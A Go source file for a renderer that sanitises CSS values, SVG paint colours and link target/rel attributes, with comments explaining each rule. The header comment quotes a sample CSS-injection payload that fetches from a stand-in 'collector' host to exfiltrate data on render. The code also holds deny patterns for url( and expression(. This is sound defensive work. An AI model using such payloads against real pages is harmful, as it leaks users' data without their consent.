package renderer

// Emission grammar for string-typed slots — the CSS / paint / anchor-token half
// of the floor whose URL half lives in sanitize.go.
//
// WHY IT EXISTS. A handful of wire slots are typed as a plain string and carry
// a grammar the type does not state: a CSS track-list (grid templateColumns), a
// CSS paint (a draw style's fill / stroke), and the two anchor token slots
// (link target / rel). Nothing about "string" says which of those a value is,
// so nothing about "string" refuses a value that is the wrong one.
//
// Until this file the rules lived at each emission site, per renderer, by hand,
// and the hosts DISAGREED. This renderer concatenated templateColumns into a
// grid-template-columns style declaration with no rule at all, so a value
// carrying `;background:url(https://collector/?d=…)` closed the declaration,
// opened a second one the document never wrote, and fetched on RENDER, with no
// user act, outside the egress policy that governs every href and src in the
// same document — while the React client assigned a style OBJECT and the
// browser dropped the identical value silently. Same tree, exfiltration channel
// here, inert there. The wire format exists to rule that out.
//
// The rules are DENY-shaped for CSS and ALLOW-shaped for paints and tokens, and
// the asymmetry is deliberate. A CSS value's grammar is genuinely open (the
// property and function sets grow, and a positive list would refuse clamp() the
// day CSS shipped it) while the set of characters that let a value leave its
// declaration is small, stable and enumerable. A colour and an anchor token set
// are genuinely closed — every member is named in a specification, and a member
// nobody named is a member nobody vetted.

import "strings"

// cssRefusalAttribute marks an element whose CSS value was refused, so the
// refusal is visible in the DOCUMENT and not only in a log. It carries the SLOT
// name and never the value, the same discipline the egress refusal marker keeps
// and for the same reason: a refused value is the payload.
const cssRefusalAttribute = "data-fuaran-css-refused"

var cssForbiddenChars = ";{}" + string(rune(92))

var cssForbiddenFunctions = []string{"url(", "expression("}

// IsSafeCSSValue reports whether a string is safe to concatenate into a CSS
// declaration.
//
// What each refused character buys an attacker inside style="<prop>:<value>":
// `;` ends the declaration, so everything after it is a NEW property the author
// never wrote; `{` and `}` end or open a RULE, reachable wherever the value
// lands in a stylesheet; `\` is CSS's own escape introducer, so `\3b` is a
// semicolon the character scan would otherwise never see — refusing the
// introducer is what makes the rest of the list total; C0 controls and DEL are
// parser-differential fodder and never meaningful in a value.
//
// url( and expression( are refused by NAME rather than by character, because
// their harm is not in their punctuation: url( fetches, which is the finding,
// and expression( executes on legacy engines.
//
// What this does NOT promise: it is not a CSS parser and says nothing about
// whether the surviving string is a VALID value for the property it lands in.
// An invalid value is dropped by the browser's own parser — a rendering defect,
// not a security one. This bounds what a value can REACH.
//
// An empty value is SAFE: it contributes nothing to the declaration, and
// refusing it would make an absent value indistinguishable from a hostile one.
func IsSafeCSSValue(value string) bool {
	for _, ch := range value {
		if ch < ' ' || ch == 0x7f || strings.ContainsRune(cssForbiddenChars, ch) {
			return false
		}
	}
	// Case-insensitive and whitespace-tolerant on the CSS side: `URL (` and
	// `url\n(` are one token to a CSS tokenizer, so a scan for the literal
	// lowercase spelling alone is a scan a payload walks past.
	var b strings.Builder
	for _, ch := range value {
		if ch != ' ' && ch != '\t' && ch != '\n' && ch != '\r' && ch != '\f' && ch != '\v' {
			b.WriteRune(ch)
		}
	}
	squashed := strings.ToLower(b.String())
	for _, fn := range cssForbiddenFunctions {
		if strings.Contains(squashed, fn) {
			return false
		}
	}
	return true
}

// SanitizeCSSValue returns the value when it passes and the empty string when
// it does not.
//
// Empty rather than a substitute: an empty declaration value is dropped by
// every CSS parser, so the element falls back to the stylesheet's own rule,
// which is what an author who wrote nothing would have got. A substitute would
// be the renderer inventing a layout the document never declared.
func SanitizeCSSValue(value string) string {
	if IsSafeCSSValue(value) {
		return value
	}
	return ""
}

// sanitizeCSSValueForSlot returns the value to emit plus the refusal attributes
// to splice, given the SLOT name the value came from.
func sanitizeCSSValueForSlot(slot string, value string) (string, []attr) {
	if IsSafeCSSValue(value) {
		return value, nil
	}
	return "", []attr{{cssRefusalAttribute, slot}}
}

// isCSSIdent reports whether a value is a bare CSS IDENT — an ASCII letter or
// `-` followed by ASCII letters, digits, `-` and `_`.
//
// This is what admits the 148 named colours (red, steelblue, rebeccapurple),
// the universal keywords (none, transparent, currentColor), the inheritance
// keywords, the SVG2 paint keywords (context-fill, context-stroke) and every
// colour keyword CSS has not shipped yet — as ONE rule rather than as a list
// somebody has to keep.
//
// Enumerating the keywords instead is wrong, because the two ways of being
// wrong here are not symmetric. A missing keyword produces no error an author
// can see: the paint is replaced by "none", so a document that was correct
// yesterday silently renders a differently-coloured picture. Meanwhile an ident
// buys an attacker nothing at all — it cannot fetch, cannot leave its
// declaration and cannot name a paint server, because every one of those needs
// punctuation this test refuses.
func isCSSIdent(value string) bool {
	if value == "" {
		return false
	}
	for i, ch := range value {
		if i == 0 {
			if !((ch >= 'a' && ch <= 'z') || (ch >= 'A' && ch <= 'Z') || ch == '-') {
				return false
			}
			continue
		}
		if !((ch >= 'a' && ch <= 'z') || (ch >= 'A' && ch <= 'Z') || (ch >= '0' && ch <= '9') || ch == '-' || ch == '_') {
			return false
		}
	}
	return true
}

var colourFunctions = []string{
	"rgb(", "rgba(", "hsl(", "hsla(", "oklch(", "oklab(", "lch(", "lab(", "color(",
}

func isHexDigit(c rune) bool {
	return (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')
}

// IsColourValue reports whether a string is a CSS colour in the closed grammar:
// a #rgb / #rrggbb / #rrggbbaa hex, one of the keywords, or a call to one of the
// named colour functions.
//
// A paint slot needs a POSITIVE grammar where a generic CSS value needs only a
// denylist, and that asymmetry is the finding: url(https://collector/x) contains
// no forbidden character, and in an SVG fill it names a paint server the user
// agent FETCHES. Only naming what a colour may BE excludes it.
func IsColourValue(value string) bool {
	t := strings.TrimSpace(value)
	if t == "" {
		return false
	}
	if strings.HasPrefix(t, "#") {
		digits := t[1:]
		if len(digits) != 3 && len(digits) != 4 && len(digits) != 6 && len(digits) != 8 {
			return false
		}
		for _, c := range digits {
			if !isHexDigit(c) {
				return false
			}
		}
		return true
	}
	if isCSSIdent(t) {
		return true
	}
	lower := strings.ToLower(t)
	for _, fn := range colourFunctions {
		if strings.HasPrefix(lower, fn) && strings.HasSuffix(lower, ")") && IsSafeCSSValue(t) {
			return true
		}
	}
	return false
}

// SanitizePaintValue returns the value when it is a colour and "none" when it
// is not.
//
// "none" rather than the empty string, because an EMPTY fill / stroke INHERITS
// the enclosing group's paint instead of clearing it — so an empty refusal
// would silently paint the shape with whatever the enclosing group declared,
// which is a different picture rather than an absent one.
func SanitizePaintValue(value string) string {
	if IsColourValue(value) {
		return strings.TrimSpace(value)
	}
	return "none"
}

// allowedLinkTargets is closed to _self and _blank.
//
// _parent and _top are meaningful only when the document is FRAMED, and a
// framed document navigating its embedder is frame-busting the embedding host
// did not consent to. A NAMED frame addresses a browsing context BY NAME, so a
// decoded tree can navigate a window it did not create and whose contents it
// cannot see, and the name is a free string with no way for a host to enumerate
// what it might hit.
var allowedLinkTargets = map[string]bool{"_self": true, "_blank": true}

// allowedLinkRelTokens is the closed rel set. Every member describes THIS
// link's relationship to its destination and changes nothing about the opener's
// capabilities in the wrong direction. The one deliberate absence is the
// finding: `opener` RE-ENABLES window.opener on a _blank link, handing the
// opened document a live reference to the opening one — the capability
// `noopener` exists to remove, and one no rendered tree has reason to ask for.
var allowedLinkRelTokens = map[string]bool{
	"alternate": true, "author": true, "bookmark": true, "external": true,
	"help": true, "license": true, "next": true, "nofollow": true,
	"noopener": true, "noreferrer": true, "prev": true, "privacy-policy": true,
	"search": true, "tag": true, "terms-of-service": true, "ugc": true,
}

// sanitizeLinkTarget returns the target to emit, or "" to omit the attribute.
//
// An unrecognised value degrades to omission rather than to _self: the two are
// the same navigation, and omitting says truthfully that the document declared
// nothing this renderer could honour, where substituting would put a value in
// the DOM the author never wrote.
func sanitizeLinkTarget(target string) string {
	t := strings.ToLower(strings.TrimSpace(target))
	if allowedLinkTargets[t] {
		return t
	}
	return ""
}

// sanitizeLinkRel returns the rel tokens to emit, given the declared rel and the
// SANITISED target. Declared-and-surviving tokens first in declared order, then
// noopener and noreferrer FORCED when the target is _blank.
//
// The forcing is what closes the finding. Modern browsers imply noopener there,
// which is exactly why the omission is dangerous rather than untidy: the
// behaviour is a user-agent DEFAULT, an explicit rel="opener" overrides it, and
// no document can know its reader's version floor. Emitting the tokens makes
// the property a fact about the document rather than about the user agent.
//
// The ORDER is fixed so two hosts given one document emit one byte sequence; an
// unordered set would make cross-host byte parity impossible to state.
func sanitizeLinkRel(rel string, sanitizedTarget string) []string {
	var declared []string
	seen := map[string]bool{}
	for _, token := range strings.Fields(rel) {
		lowered := strings.ToLower(token)
		if allowedLinkRelTokens[lowered] && !seen[lowered] {
			seen[lowered] = true
			declared = append(declared, lowered)
		}
	}
	if sanitizedTarget == "_blank" {
		for _, forced := range []string{"noopener", "noreferrer"} {
			if !seen[forced] {
				declared = append(declared, forced)
			}
		}
	}
	return declared
}

// sanitizeLinkAnchor resolves the two anchor attributes TOGETHER — target
// first, then rel, because the rel rule DEPENDS on the sanitised target. A site
// that sanitised them independently would get the dependency wrong in exactly
// the case that matters. Either result may be "" to omit its attribute.
func sanitizeLinkAnchor(target string, rel string) (string, string) {
	safeTarget := sanitizeLinkTarget(target)
	tokens := sanitizeLinkRel(rel, safeTarget)
	return safeTarget, strings.Join(tokens, " ")
}
